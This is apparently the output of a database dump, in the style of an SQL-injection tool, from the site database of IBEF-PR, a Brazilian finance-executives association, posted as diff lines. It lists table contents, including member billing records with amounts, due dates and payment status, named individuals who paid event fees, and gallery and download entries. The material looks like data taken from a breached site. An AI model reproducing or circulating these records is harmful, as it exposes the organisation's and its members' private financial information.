+| 37      |
+| 38      |
+| 39      |
+| 40      |
+| 41      |
+| 42      |
+| 43      |
+| 44      |
+| 45      |
+| 46      |
+| 47      |
+| 48      |
+| 49      |
+| 50      |
++---------+
+
+Database: ibefprco_ger
+Table: t_candidatos
+[36 entries]
++----------+
+| cand_cod |
++----------+
+| 1        |
+| 2        |
+| 3        |
+| 4        |
+| 5        |
+| 6        |
+| 7        |
+| 9        |
+| 10       |
+| 11       |
+| 12       |
+| 13       |
+| 14       |
+| 15       |
+| 16       |
+| 17       |
+| 18       |
+| 19       |
+| 20       |
+| 21       |
+| 22       |
+| 23       |
+| 24       |
+| 25       |
+| 26       |
+| 27       |
+| 28       |
+| 29       |
+| 30       |
+| 31       |
+| 32       |
+| 33       |
+| 34       |
+| 35       |
+| 36       |
+| 37       |
++----------+
+
+Database: ibefprco_ger
+Table: t_comunicados
+[19 entries]
++---------+
+| com_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
+| 8       |
+| 9       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
+| 14      |
+| 15      |
+| 16      |
+| 17      |
+| 18      |
+| 19      |
++---------+
+
+Database: ibefprco_ger
+Table: t_contacorrente
+[50 entries]
++-----------+
+| conta_cod |
++-----------+
+| 1         |
+| 5         |
+| 6         |
+| 7         |
+| 8         |
+| 9         |
+| 10        |
+| 11        |
+| 12        |
+| 13        |
+| 14        |
+| 15        |
+| 16        |
+| 17        |
+| 18        |
+| 19        |
+| 20        |
+| 21        |
+| 22        |
+| 23        |
+| 24        |
+| 25        |
+| 26        |
+| 27        |
+| 28        |
+| 29        |
+| 30        |
+| 31        |
+| 32        |
+| 33        |
+| 34        |
+| 35        |
+| 36        |
+| 37        |
+| 38        |
+| 39        |
+| 40        |
+| 41        |
+| 42        |
+| 43        |
+| 44        |
+| 45        |
+| 46        |
+| 47        |
+| 48        |
+| 49        |
+| 50        |
+| 51        |
+| 52        |
+| 53        |
++-----------+
+
+Database: ibefprco_ger
+Table: t_contacorrente_cnr
+[50 entries]
++--------------+-------+---------+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+------------+------------+-------------+--------------+--------------+---------------+---------------------+
+| conta_pedido | ativo | soc_cod | user_cod | conta_obs                                                                                                                                                                                                                                                                                     | conta_cod | conta_tipo | conta_venc | conta_valor | conta_status | conta_boleto | conta_paypall | conta_dt_baixa      |
++--------------+-------+---------+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+------------+------------+-------------+--------------+--------------+---------------+---------------------+
+| 20000001     | s     | 9871    | 5        | Prezado Ibefiano,\r\n\r\nSegue o boleto para o pagamento da sua primeira trimestralidade referente aos meses de Outubro, Novembro e Dezembro de 2013.\r\nApos o pagamento da sua primeira trimestralidade o senhor poderá votar no seu candidato ao Premio Equilibrista 2013.\r\n\r\nQualquer | 0000001   | s          | 2013-10-08 | 200,00      | PG           | s            | n             | NULL                |
+| 20000002     | s     | 9873    | 5        | Boleto referente à primeira trimestralidade dos meses                                                                                                                                                                                                                                         | 0000002   | s          | 2013-10-09 | 200,00      | PG           | s            | n             | 2013-10-09 16:55:54 |
+| 20000003     | s     | 9874    | 5        | Prezado Ibefiano,\r\n\r\nSegue boleto para o pagamento da primeira trimestralidade referente aos meses de Outubro, Novembro e Dezembro de 2013.\r\n\r\nApos o pagamento seu cpf será liberado para votação no candidato ao Premio                                                             | 0000003   | s          | 2013-10-09 | 200,00      | PG           | s            | n             | 2013-10-09 16:57:01 |
+| 20000004     | s     | 9878    | 5        | Prezado Ibefiano,\r\n\r\nSeja Bem Vindo ao IBEF-PR!\r\n\r\nSegue boleto referente à sua primeira trimestralidade de                                                                                                                                                                           | 0000006   | s          | 2013-10-11 | 200,00      | PG           | s            | n             | 2013-10-15 11:19:29 |
+| 20000007     | s     | 9879    | 5        | Prezado Ibefiano,\r\nSeja Bem Vindo ao IBEF-PR!\r\n\r\nPara ativar seu cadastro é necessaria a quitação deste boleto referente aos meses de Outubro, Novembro e Dezembrode                                                                                                                    | 0000008   | s          | 2013-10-25 | 200,00      | <blank>      | s            | n             | NULL                |
+| 20000009     | s     | 857     | 5        | Boleto referente à trimestralidade de Outubro, Novembro e Dezembro de 2013.\r\n                                                                                                                                                                                                               | 0000009   | s          | 2013-10-31 | 200,00      | <blank>      | s            | n             | NULL                |
+| 20000011     | s     | 306     | 5        | Boleto referente à trimestralidade de Outubro, Novembro e Dezembro de 2013.                                                                                                                                                                                                                   | 0000011   | s          | 2013-10-31 | 200,00      | <blank>      | s            | n             | NULL                |
+| 20000012     | s     | 9880    | 5        | Boleto ref. Out. Nov. e Dez 13.                                                                                                                                                                                                                                                               | 0000012   | s          | 2013-11-28 | 200,00      | PG           | s            | n             | NULL                |
+| 20000013     | s     | 888     | 5        | Boleto referente à novembro e dezembro de 2013.                                                                                                                                                                                                                                               | 0000013   | s          | 2013-11-30 | 133,34      | PG           | s            | n             | NULL                |
+| 20000014     | s     | 979     | 5        | Boleto ref. ao patrocinio do ev. A MEDIDA PROVISÓRIA 627                                                                                                                                                                                                                                      | 0000014   | e          | 2013-12-03 | 5000,00     | PG           | s            | n             | 2013-12-04 13:55:48 |
+| 20000015     | s     | 9881    | 5        | Boleto referente à primeira trimestralidade.                                                                                                                                                                                                                                                  | 0000015   | s          | 2013-12-10 | 200,00      | <blank>      | s            | n             | NULL                |
+| 20000016     | s     | 562     | 5        | Boleto referente à trimestralidade de Novembro, Dezembro e Janeiro de 2014.                                                                                                                                                                                                                   | 0000016   | s          | 2013-12-09 | 210,00      | <blank>      | s            | n             | NULL                |
+| 20000017     | s     | 857     | 5        | Boleto ref. a Dezembro 13, Janeiro e Fevereiro 2014.                                                                                                                                                                                                                                          | 0000017   | s          | 2013-12-10 | 210,00      | <blank>      | s            | n             | NULL                |
+| 20000018     | s     | 9882    | 5        | NULL                                                                                                                                                                                                                                                                                          | 0000018   | s          | 2013-12-16 | 210,00      | <blank>      | s            | n             | NULL                |
+| 20000050     | s     | 306     | 5        | Boleto referente à trimestralidade de Janeiro, Fevereiro                                                                                                                                                                                                                                      | 0000050   | s          | 2013-02-18 | 230,00      | <blank>      | s            | n             | NULL                |
+| 20000074     | s     | 9893    | 5        | Boleto referente à primeira trimestralidade dos meses                                                                                                                                                                                                                                         | 0000074   | s          | 2014-08-10 | 220,00      | PG           | s            | n             | NULL                |
+| 20000075     | s     | 890     | 5        | Boleto referente à trimestralidade de Maio, Junho e Julho de 2014.                                                                                                                                                                                                                            | 0000075   | s          | 2014-07-31 | 230,00      | PG           | s            | n             | NULL                |
+| 20000076     | s     | 9894    | 5        | Boleto referente à anuidade proporcional à 2014.                                                                                                                                                                                                                                              | 0000076   | s          | 2014-08-15 | 370,00      | PG           | s            | n             | NULL                |
+| 20000077     | s     | 987     | 5        | Boleto referente ao Patrocínio do evento à ser realizado no dia 02 de setembro de 2014.                                                                                                                                                                                                       | 0000077   | e          | 2014-08-29 | 4000,00     | PG           | s            | n             | 2014-09-01 13:34:01 |
+| 20000079     | s     | 990     | 5        | Boleto referente ao Patrocínio do Evento Inteligência                                                                                                                                                                                                                                         | 0000079   | e          | 2014-08-18 | 2500,00     | PG           | s            | n             | NULL                |
+| 20000080     | s     | 991     | 5        | Boleto referente ao Patrocínio do Evento Premio Equilibrista 2014.                                                                                                                                                                                                                            | 0000080   | e          | 2014-09-15 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000081     | s     | 989     | 5        | Boleto referente ao Patrocínio do Evento Inteligência                                                                                                                                                                                                                                         | 0000081   | e          | 2014-08-18 | 2500,00     | PG           | s            | n             | NULL                |
+| 20000082     | s     | 414     | 5        | Boleto referente à taxa de inscrição do Sr. Ricardo Becker e Mariana Amaral, para a Palestra sobre Business Intelligence.                                                                                                                                                                     | 0000082   | s          | 2014-08-21 | 120,00      | PG           | s            | n             | NULL                |
+| 20000083     | s     | 992     | 5        | Boleto referente à taxa de inscrição do Sr. Leonardo R. M. Matt para a palestra de Inteligência de Negócios, realizada no dia 20 de agosto de 2014.                                                                                                                                           | 0000083   | e          | 2014-08-21 | 80,00       | PG           | s            | n             | NULL                |
+| 20000087     | s     | 9896    | 5        | Boleto referente à primeira trimestralidade. Agosto, Setembro e Outubro de 2014.                                                                                                                                                                                                              | 0000088   | s          | 2014-09-09 | 220,00      | PG           | s            | n             | NULL                |
+| 20000089     | s     | 9895    | 5        | Boleto referente à primeira trimestralidade de Agosto, Setembro e Outubro de 2014.                                                                                                                                                                                                            | 0000089   | s          | 2014-09-09 | 220,00      | PG           | s            | n             | NULL                |
+| 20000091     | s     | 631     | 5        | Boleto referente ao patrocínio do evento entrega do prêmio Equilibrista 2014.                                                                                                                                                                                                                 | 0000091   | e          | 2014-09-10 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000092     | s     | 9897    | 5        | Boleto referente à primeira trimestralidade - Setembro, Outubro e Novembro de 2014.                                                                                                                                                                                                           | 0000092   | s          | 2014-09-12 | 220,00      | PG           | s            | n             | NULL                |
+| 20000093     | s     | 515     | 5        | BOLETO REFERENTE À COMPRA DE UMA MESA PARA O PREMIO EQUILIBRISTA 2014.                                                                                                                                                                                                                        | 0000094   | e          | 2014-10-06 | 6500,00     | PG           | s            | n             | 2014-10-23 10:47:16 |
+| 20000095     | s     | 9899    | 5        | Boleto referente a primeira trimestralidade. Outubro, Novembro e Dezembro de 2014.                                                                                                                                                                                                            | 0000095   | s          | 2014-10-03 | 220,00      | PG           | s            | n             | NULL                |
+| 20000096     | s     | 9900    | 5        | Boleto referente a primeira trimestralidade de Outubro, Novembro e Dezembro de 2014.                                                                                                                                                                                                          | 0000096   | s          | 2014-10-10 | 220,00      | PG           | s            | n             | NULL                |
+| 20000100     | s     | 997     | 5        | Boleto referente à aquisição de uma mesa para a solenidade de entrega do Premio Equilibrista 2014.                                                                                                                                                                                            | 0000100   | e          | 2014-10-15 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000102     | s     | 994     | 5        | Boleto referente à aquisição de uma mesa para a solenidade de entrega do Premio Equilibrista 2014.                                                                                                                                                                                            | 0000102   | e          | 2014-10-21 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000103     | s     | 901     | 5        | Boleto referente à aquisição de uma mesa para a solenindade de entrega do Prêmio Equilibrista 2014.                                                                                                                                                                                           | 0000103   | e          | 2014-10-15 | 4000,00     | PG           | s            | n             | NULL                |
+| 20000104     | s     | 978     | 5        | Boleto referente à aquisição de uma mesa para solenidade de entrega do Prêmio Equilibrista 2014.                                                                                                                                                                                              | 0000104   | e          | 2014-10-24 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000106     | s     | 128     | 5        | Boleto referente à aquisição de uma mesa para solenidade de entrega do Prêmio Equilibrista 2014.                                                                                                                                                                                              | 0000106   | e          | 2014-10-24 | 11000,00    | PG           | s            | n             | NULL                |
+| 20000108     | s     | 982     | 5        | Boleto referente à aquisição de uma mesa para a solenidade de entrega do Premio Equilibrista 2014.                                                                                                                                                                                            | 0000108   | e          | 2014-10-24 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000109     | s     | 834     | 5        | Boleto referente à aquisição de uma mesa para a solenidade de entrega do premio Equilibrista 2014.                                                                                                                                                                                            | 0000109   | e          | 2014-11-03 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000114     | s     | 996     | 5        | Boleto referente ao patrocínio da solenidade de entrega do premio Equilibrista 2014.                                                                                                                                                                                                          | 0000114   | e          | 2014-10-24 | 50000,00    | PG           | s            | n             | NULL                |
+| 20000115     | s     | 709     | 5        | Boleto referente à aquisição de duas mesas para a solenidade de entrega do Premio Equilibrista 2014.                                                                                                                                                                                          | 0000115   | e          | 2014-10-27 | 11000,00    | PG           | s            | n             | NULL                |
+| 20000116     | s     | 949     | 5        | Boleto referente à aquisição de 6 convites para a solenidade de entrega de Premio Equilibrista 2014                                                                                                                                                                                           | 0000116   | e          | 2014-10-23 | 790,00      | PG           | s            | n             | NULL                |
+| 20000117     | s     | 930     | 5        | Boleto                                                                                                                                                                                                                                                                                        | 0000117   | e          | 2014-10-27 | 940,00      | PG           | s            | n             | NULL                |
+| 20000118     | s     | 999     | 5        | Boleto referente à anuidade proporcional de pessoa juridica.                                                                                                                                                                                                                                  | 0000118   | e          | 2014-11-19 | 660,00      | PG           | s            | n             | NULL                |
+| 20000120     | s     | 9907    | 5        | Boleto referente à primeira trimestralidade.                                                                                                                                                                                                                                                  | 0000120   | s          | 2014-10-31 | 220,00      | PG           | s            | n             | NULL                |
+| 20000121     | s     | 9907    | 5        | Boleto referente à aquisição de uma mesa mais 4 pares                                                                                                                                                                                                                                         | 0000121   | s          | 2014-11-14 | 5800,00     | PG           | s            | n             | NULL                |
+| 20000122     | s     | 1000    | 5        | Boleto referente à aquisição de uma mesa  para o evento da entrega do Premio Equilibrista 2014.                                                                                                                                                                                               | 0000122   | e          | 2014-11-14 | 4000,00     | PG           | s            | n             | NULL                |
+| 20000123     | s     | 9908    | 5        | Boleto referente à aquisição de 1 par de convite para                                                                                                                                                                                                                                         | 0000123   | s          | 2014-10-30 | 450,00      | <blank>      | s            | n             | NULL                |
+| 20000124     | s     | 343     | 5        | Boleto referente à aquisição de uma mesa para o premio Equilibrista 2014.                                                                                                                                                                                                                     | 0000124   | e          | 2014-11-07 | 6500,00     | PG           | s            | n             | NULL                |
+| 20000125     | s     | 911     | 5        | Boleto referente à aquisição de um par de convites para a entrega do Premio Equilibrista 2014.                                                                                                                                                                                                | 0000125   | s          | 2014-10-30 | 300,00      | PG           | s            | n             | NULL                |
+| 20000127     | s     | 9898    | 5        | Boleto referente à aquisição de um par de convites para o evento premio Equilibrista 2014.                                                                                                                                                                                                    | 0000127   | s          | 2014-10-30 | 300,00      | PG           | s            | n             | NULL                |
++--------------+-------+---------+----------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+------------+------------+-------------+--------------+--------------+---------------+---------------------+
+
+Database: ibefprco_ger
+Table: t_downloads
+[2 entries]
++----------+
+| aula_cod |
++----------+
+| 1        |
+| 2        |
++----------+
+
+Database: ibefprco_ger
+Table: t_downloads_arquivos
+[3 entries]
++---------+----------+----------+----------+-----------+------------------------------------------------------+
+| arq_cod | aula_cod | user_cod | arq_nome | arq_ativo | arq_titulo                                           |
++---------+----------+----------+----------+-----------+------------------------------------------------------+
+| 1       | 1        | 2        | 1_0.pdf  | s         | RECOF-SPED - Gaia Silva Gaede Advogados & Associados |
+| 2       | 1        | 2        | 1_1.pdf  | s         | RECOF-SPED - PWC                                     |
+| 3       | 2        | 2        | 2_0.pdf  | s         | Transfer Pricing - b2finance Kreston Brasil          |
++---------+----------+----------+----------+-----------+------------------------------------------------------+
+
+Database: ibefprco_ger
+Table: t_empresas
+[50 entries]
++--------+
+| codigo |
++--------+
+| 0      |
+| 1      |
+| 2      |
+| 3      |
+| 4      |
+| 5      |
+| 6      |
+| 7      |
+| 8      |
+| 9      |
+| 10     |
+| 11     |
+| 12     |
+| 13     |
+| 14     |
+| 15     |
+| 16     |
+| 17     |
+| 18     |
+| 19     |
+| 20     |
+| 21     |
+| 22     |
+| 23     |
+| 24     |
+| 25     |
+| 26     |
+| 27     |
+| 28     |
+| 29     |
+| 30     |
+| 31     |
+| 32     |
+| 33     |
+| 34     |
+| 35     |
+| 36     |
+| 37     |
+| 38     |
+| 39     |
+| 40     |
+| 41     |
+| 42     |
+| 43     |
+| 44     |
+| 45     |
+| 46     |
+| 47     |
+| 48     |
+| 49     |
++--------+
+
+Database: ibefprco_ger
+Table: t_estados
+[28 entries]
++---------+
+| est_cod |
++---------+
+| 0       |
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
+| 8       |
+| 9       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
+| 14      |
+| 15      |
+| 16      |
+| 17      |
+| 18      |
+| 19      |
+| 20      |
+| 21      |
+| 22      |
+| 23      |
+| 24      |
+| 25      |
+| 26      |
+| 27      |
++---------+
+
+Database: ibefprco_ger
+Table: t_eventos
+[50 entries]
++----------+
+| even_cod |
++----------+
+| 1        |
+| 2        |
+| 5        |
+| 6        |
+| 7        |
+| 8        |
+| 9        |
+| 10       |
+| 11       |
+| 12       |
+| 13       |
+| 14       |
+| 15       |
+| 16       |
+| 17       |
+| 18       |
+| 19       |
+| 20       |
+| 21       |
+| 22       |
+| 23       |
+| 24       |
+| 25       |
+| 26       |
+| 27       |
+| 28       |
+| 29       |
+| 30       |
+| 32       |
+| 33       |
+| 34       |
+| 37       |
+| 38       |
+| 39       |
+| 41       |
+| 42       |
+| 43       |
+| 44       |
+| 45       |
+| 46       |
+| 47       |
+| 48       |
+| 49       |
+| 50       |
+| 51       |
+| 52       |
+| 53       |
+| 54       |
+| 55       |
+| 56       |
++----------+
+
+Database: ibefprco_ger
+Table: t_gal_imagem
+[50 entries]
++-------------+
+| gal_img_cod |
++-------------+
+| 1           |
+| 2           |
+| 3           |
+| 4           |
+| 5           |
+| 6           |
+| 7           |
+| 8           |
+| 9           |
+| 10          |
+| 11          |
+| 12          |
+| 13          |
+| 15          |
+| 16          |
+| 17          |
+| 18          |
+| 19          |
+| 20          |
+| 21          |
+| 22          |
+| 23          |
+| 24          |
+| 25          |
+| 26          |
+| 27          |
+| 28          |
+| 29          |
+| 30          |
+| 31          |
+| 32          |
+| 33          |
+| 36          |
+| 37          |
+| 38          |
+| 39          |
+| 41          |
+| 42          |
+| 43          |
+| 44          |
+| 45          |
+| 46          |
+| 47          |
+| 48          |
+| 49          |
+| 50          |
+| 51          |
+| 53          |
+| 64          |
+| 67          |
++-------------+
+
+Database: ibefprco_ger
+Table: t_galeria
+[11 entries]
++---------+
+| gal_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 7       |
+| 8       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
++---------+
+
+Database: ibefprco_ger
+Table: t_galeria_eventos
+[50 entries]
++----------+-------------+--------------+----------------------------------------------------------------------------------------------+----------------------------------------------------+---------------+
+| user_cod | galeria_cod | galeria_data | galeria_desc                                                                                 | galeria_nome                                       | galeria_ativo |
++----------+-------------+--------------+----------------------------------------------------------------------------------------------+----------------------------------------------------+---------------+
+| 0        | 78          | 0000-00-00   | CLIPPING IBEF PR 13 11 08                                                                    | Entrega do Prêmio Equilibrista 2011                | s             |
+| 0        | 61          | 0000-00-00   | Equilibrista 2009                                                                            | Ev. 15 04 10 O Poder das Mídias Sociais            | s             |
+| 0        | 60          | 0000-00-00   | Equilibrista 2011 Fotos Estudio                                                              | Ev. 08 04 2010 Gaia, Silva, Gaede & Associados     | s             |
+| 0        | 59          | 0000-00-00   | Equilibrista 2007                                                                            | Ev. 09 03 2010 Resp.Civil de Exec. e Diretores     | s             |
+| 0        | 58          | 0000-00-00   | Pacote Tributário 2008 e Alterações na L.S.A.- 20/02/08                                      | Festa Aniver e novos Assoc 2º Semestre 2009        | s             |
+| 0        | 57          | 0000-00-00   | Posse Diretoria Gestão 2007/2008 - 05/3/07                                                   | Contratos Sob Regência Legislação Norte Americana  | s             |
+| 0        | 56          | 0000-00-00   | Gestão sem Medo 10/04/07                                                                     | Decoração e local - Equilibrista 2009              | s             |
+| 0        | 55          | 0000-00-00   | SPED - Sistema Público de Escrituração Digital 12 03 08                                      | A Festa - Equilibrista 2009                        | s             |
+| 0        | 54          | 0000-00-00   | Senso Bovespa 30 05 07                                                                       | A Premiação - Equilibrista 2009                    | s             |
+| 0        | 53          | 0000-00-00   | Jantar Aniversariantes 2°, 3° e 4° trims 2007 - 12/11                                        | Fotos Estúdio - Equilibrista 2009                  | s             |
+| 0        | 51          | 0000-00-00   | Crimes Digitais na Área Financeira 10 04 08                                                  | Ev. 17 09 09 Tecnologia para Gestaão de Finanças   | s             |
+| 0        | 50          | 0000-00-00   | A Força do Sul do Brasil 15 04 08                                                            | Jantar dos Aniver. e Novos Assoc. do 1º Semestre   | s             |
+| 0        | 62          | 0000-00-00   | Resseguros 15 05 08                                                                          | Ev. 12 05 10 Cenário Economico Global e Doméstico  | s             |
+| 0        | 63          | 0000-00-00   | Encontro Socio Esportivo 2008!                                                               | Ev. 19 05 2010 - A Empresa e o Meio Ambiente       | s             |
+| 0        | 64          | 0000-00-00   | Jantar Aniversariantes e Novos Associados 11 06 08                                           | Jantar Aniver. Novos Assoc. 1° Semestre 2010       | s             |
+| 0        | 77          | 0000-00-00   | Liderança Empreendedora 09 07 08                                                             | Jantar Prêmio Equilibrista 2011                    | s             |
+| 0        | 76          | 0000-00-00   | Equilibrista 2006                                                                            | Prêmio Equilibrista 2011 Decoração                 | s             |
+| 0        | 73          | 0000-00-00   | (SPED) 22 10 08                                                                              | Linhas de Repasse e Financiamento - Café da Manhã  | s             |
+| 0        | 72          | 0000-00-00   | Equilibrista 2008                                                                            | Gestão de Preço Estratégico. Dia 26 05             | s             |
+| 0        | 71          | 0000-00-00   | ?Normas Internacionais de Contabilidade (IFRS)?                                              | Evento 12 05 2011                                  | s             |
+| 0        | 70          | 0000-00-00   | Jantar Aniver. e Novos Assoc. 2º Semestre de 08                                              | Evento 27 04 11 - Sinais de Alerta nas Negociações | s             |
+| 0        | 69          | 0000-00-00   | Painel das Alterações Tributarias 05 02 09                                                   | Posse Diretoria 2011/2013 - 23 03 11               | s             |
+| 0        | 68          | 0000-00-00   | A Força do Sul do Brasil 12 02 09                                                            | Evento 11 11 10 - Comprando e Vendendo sua Empresa | s             |
+| 0        | 67          | 0000-00-00   | Palestra a "Crise e os Executivos" e a Posse Diretoria 2009/11                               | Equilibrista 28 10 2010                            | s             |
+| 0        | 66          | 0000-00-00   | Ev. 19/05/09 Oportunidade de invest. em Curitiba                                             | Ev. Controladoria e Governança Corporativa no Br   | s             |
+| 0        | 65          | 0000-00-00   | Ev. 09 06 09 Preservação do seu Patrimônio                                                   | Ev. 24 06 Parceria com FBM Consulting              | s             |
+| 0        | 49          | 0000-00-00   | Evento: Auditoria Fiscal 15 07 09                                                            | A Crise e o Valor da Empresas 17 08 09             | s             |
+| 0        | 40          | 0000-00-00   | A Crise e o Valor da Empresas 17 08 09                                                       | CLIPPING IBEF PR 13 11 08                          | n             |
+| 0        | 32          | 0000-00-00   | Jantar dos Aniver. e Novos Assoc. do 1º Semestre                                             | A Força do Sul do Brasil 15 04 08                  | s             |
+| 0        | 31          | 0000-00-00   | Ev. 17 09 09 Tecnologia para Gestaão de Finanças                                             | Crimes Digitais na Área Financeira 10 04 08        | s             |
+| 0        | 30          | 0000-00-00   | Fotos Estúdio - Equilibrista 2009                                                            | Jantar Aniversariantes 2°, 3° e 4° trims 2007 - 12 | s             |
+| 0        | 29          | 0000-00-00   | A Premiação - Equilibrista 2009                                                              | Senso Bovespa 30 05 07                             | s             |
+| 0        | 28          | 0000-00-00   | A Festa - Equilibrista 2009                                                                  | SPED - Sistema Público de Escrituração Digital 12  | s             |
+| 0        | 27          | 0000-00-00   | Decoração e local - Equilibrista 2009                                                        | Gestão sem Medo 10/04/07                           | s             |
+| 0        | 26          | 0000-00-00   | Contratos Sob Regência Legislação Norte Americana                                            | Posse Diretoria Gestão 2007/2008 - 05/3/07         | s             |
+| 0        | 20          | 0000-00-00   | Festa Aniver e novos Assoc 2º Semestre 2009                                                  | Pacote Tributário 2008 e Alterações na L.S.A.- 20  | s             |
+| 0        | 14          | 0000-00-00   | Ev. 09 03 2010 Resp.Civil de Exec. e Diretores                                               | Equilibrista 2007                                  | s             |
+| 0        | 75          | 0000-00-00   | Ev. 08 04 2010 Gaia, Silva, Gaede & Associados                                               | Equilibrista 2011                                  | n             |
+| 0        | 52          | 0000-00-00   | Ev. 15 04 10 O Poder das Mídias Sociais                                                      | Equilibrista 2009                                  | n             |
+| 0        | 33          | 0000-00-00   | Ev. 12 05 10 Cenário Economico Global e Doméstico                                            | Resseguros 15 05 08                                | s             |
+| 0        | 34          | 0000-00-00   | Ev. 19 05 2010 - A Empresa e o Meio Ambiente                                                 | Encontro Socio Esportivo 2008!                     | s             |
+| 0        | 35          | 0000-00-00   | Jantar Aniver. Novos Assoc. 1° Semestre 2010                                                 | Jantar Aniversariantes,1º semest. 08 e Novos Assoc | s             |
+| 0        | 48          | 0000-00-00   | Ev. 24 06 Parceria com FBM Consulting                                                        | Evento: Auditoria Fiscal 15 07 09                  | s             |
+| 0        | 47          | 0000-00-00   | Evento 29 07 2010                                                                            | Ev. 09 06 09 Preservação do seu Patrimônio         | s             |
+| 0        | 46          | 0000-00-00   | Equilibrista 28 10 2010                                                                      | Ev. 19/05/09 Oportunidade de invest. em Curitiba   | s             |
+| 0        | 45          | 0000-00-00   | Evento 11 11 10 - Comprando e Vendendo sua Empresa                                           | Palestra e Posse da Diretoria do IBEF PR 2009/11   | s             |
+| 0        | 44          | 0000-00-00   | Posse Diretoria 2011/2013 - 23 03 11                                                         | A Força do Sul do Brasil 12 02 09                  | s             |
+| 0        | 43          | 0000-00-00   | Evento 27 04 11 - Sinais de Alerta nas Negociações                                           | Painel das Alterações Tributarias 05 02 09         | s             |
+| 0        | 42          | 0000-00-00   | Evento 12 05 2011 - Investimentos e Incentivos Fiscais Para Projetos de Inovação Tecnológica | Jantar Aniver. e Novos Assoc. 2º Semestre de 08    | s             |
+| 0        | 36          | 0000-00-00   | Evento                                                                                       | Liderança Empreendedora 09 07 08                   | s             |
++----------+-------------+--------------+----------------------------------------------------------------------------------------------+----------------------------------------------------+---------------+
+
+Database: ibefprco_ger
+Table: t_galeria_eventos_imagem
+[50 entries]
++-------+----------+-------------+-----------------+------------------+------------------+---------------------------------+---------------------+----------------------+
+| ativo | user_cod | galeria_cod | galeria_img_cod | galeria_img_foto | galeria_img_tipo | galeria_img_nome                | galeria_img_legenda | galeria_img_destaque |
++-------+----------+-------------+-----------------+------------------+------------------+---------------------------------+---------------------+----------------------+
+| e     | 5        | 106         | 5574            | ÿØÿà             | image/jpeg       | capa.jpg                        | <blank>             | s                    |
+| e     | 9        | 121         | 6741            | ÿØÿâ             | image/jpeg       | 0_(2).jpg                       | <blank>             | n                    |
+| e     | 9        | 131         | 6753            | ÿØÿà             | image/jpeg       | 0_(1).jpg                       | <blank>             | n                    |
+| e     | 9        | 131         | 6754            | ÿØÿà             | image/jpeg       | 0_(2).jpg                       | <blank>             | n                    |
+| e     | 9        | 131         | 6755            | ÿØÿà             | image/jpeg       | 0_(6).jpg                       | <blank>             | n                    |
+| e     | 9        | 131         | 6756            | ÿØÿà             | image/jpeg       | 0_(10).jpg                      | <blank>             | n                    |
+| e     | 9        | 117         | 6875            | ÿØÿà             | image/jpeg       | apresentacao_dos_candidatos.jpg | <blank>             | n                    |
+| s     | 0        | 14          | 32              | NULL             | NULL             | 14/1202996449_ibef001.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 33              | NULL             | NULL             | 14/1202997662_ibef002.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 34              | NULL             | NULL             | 14/1202997890_ibef03.jpg        | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 35              | NULL             | NULL             | 14/1202997912_ibef04.jpg        | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 36              | NULL             | NULL             | 14/1202997928_ibef06.jpg        | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 37              | NULL             | NULL             | 14/1202997942_ibef009.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 38              | NULL             | NULL             | 14/1202997967_ibef010.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 39              | NULL             | NULL             | 14/1202997980_ibef011.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 40              | NULL             | NULL             | 14/1202997991_ibef012.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 41              | NULL             | NULL             | 14/1202998005_ibef013.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 42              | NULL             | NULL             | 14/1202998020_ibef014.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 43              | NULL             | NULL             | 14/1202998035_ibef018.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 44              | NULL             | NULL             | 14/1202998046_ibef019.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 45              | NULL             | NULL             | 14/1202998058_ibef020.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 46              | NULL             | NULL             | 14/1202998086_ibef021.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 47              | NULL             | NULL             | 14/1202998109_ibef022.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 49              | NULL             | NULL             | 14/1202998132_ibef023.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 50              | NULL             | NULL             | 14/1202998144_ibef024.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 51              | NULL             | NULL             | 14/1202998154_ibef025.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 52              | NULL             | NULL             | 14/1202998168_ibef026.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 53              | NULL             | NULL             | 14/1203003302_ibef027.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 54              | NULL             | NULL             | 14/1203003316_ibef028.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 55              | NULL             | NULL             | 14/1203003329_ibef029.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 56              | NULL             | NULL             | 14/1203003341_ibef030.jpg       | Equilibrista 2007   | s                    |
